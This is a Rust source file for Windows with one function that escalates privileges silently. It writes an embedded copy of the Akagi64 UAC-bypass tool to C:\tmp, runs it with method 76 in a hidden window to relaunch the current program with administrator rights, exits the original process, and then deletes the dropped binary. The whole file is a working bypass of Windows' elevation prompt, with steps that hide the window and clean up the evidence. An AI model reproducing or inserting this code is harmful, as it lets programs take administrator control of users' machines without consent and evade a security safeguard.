use std::{os::windows::process::CommandExt, path::PathBuf, process::Command};

use winapi::um::winbase::CREATE_NO_WINDOW;

/**
 * If already elevated, continues as normal.
 * Otherwise it will use Akagi64 to spawn an escalated version of itself and kill the original process.
 */
pub fn ensure_elevated() {
    let akagi_path = PathBuf::from(r"C:\tmp\Akagi64.exe");
    let akagi_bytes = include_bytes!("../Akagi64.bin");

    /* Ensure Elevation */

    if !is_elevated::is_elevated() {
        /* Extract akagi to file to and execute with the current program as the argument */

        std::fs::write(&akagi_path, akagi_bytes).expect("Could not write akagi binary");

        Command::new(&akagi_path)
            .args(["76", std::env::current_exe().unwrap().to_str().unwrap()])
            .creation_flags(CREATE_NO_WINDOW)
            .spawn()
            .expect("Failed to spawn Akagi64");

        std::process::exit(0)
    }

    /* Elevation cleanup */

    while akagi_path.exists() {
        if let Err(_) = std::fs::remove_file(&akagi_path) {
            println!("Failed to remove Akagi64.exe");
            continue;
        };
    }
}
